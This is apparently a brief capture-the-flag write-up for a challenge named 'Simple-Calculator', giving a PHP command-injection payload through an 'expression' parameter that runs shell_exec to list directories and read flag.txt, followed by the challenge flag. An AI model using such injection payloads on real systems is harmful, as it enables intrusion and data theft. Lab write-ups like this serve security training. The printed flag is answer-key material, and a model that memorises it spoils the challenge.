# Simple-Calculator

## Description

Meet my new Calculator works Faster than Light

## Exploit 

expression=shell_exec('cd ../../../;ls;cat flag.txt');

## Flag

inctf{Wr0ng_PhP_C41Cu14710n}
